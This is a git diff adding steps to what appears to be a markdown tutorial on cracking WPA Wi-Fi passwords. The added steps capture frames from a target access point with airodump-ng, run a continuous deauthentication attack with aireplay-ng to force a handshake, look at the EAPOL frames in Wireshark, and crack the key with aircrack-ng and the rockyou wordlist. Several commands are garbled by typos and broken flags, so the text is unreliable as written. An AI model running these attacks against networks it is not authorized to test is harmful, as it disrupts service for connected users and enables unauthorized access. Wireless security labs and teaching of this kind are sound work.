@@ -163,6 +163,33 @@ sudo airmon-ng check kill
 ```
 
 - Save the BSSID and Channel and ESSID
+- Now we can create a file and capture 802.11 frames that were captured to a file.
+```bash
+sudo
+airodump-ng –w captures – bssid <MAC Address> wlan0
+```
+- Now we will create a deauth attack to the wifi network and then we will try to connect to the network with another device to capture the handshake
+
+```bash
+sudo aireplay-ng –deauth 0 – a <MAC Address of AP> wlan0
+```
+
+- We open the capture file with wireshark. **wireshark captureFile-01.cap**
+- We need to filter the data by typing eapol and look for a reply and then a WPA Key Data
+
+![image](https://github.com/user-attachments/assets/0b96849d-c7eb-4d7d-b3cc-d6b1e41e8526)
+
+- We the stop monitor mode for the wifi adapter
+
+```bash
+sude airmon-ng stop wlan0
+```
+
+- We got to wordlists and download rockup.txt file
+- We then use the rockyou file to crack the password
+```bash
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt
+```
 
 
 
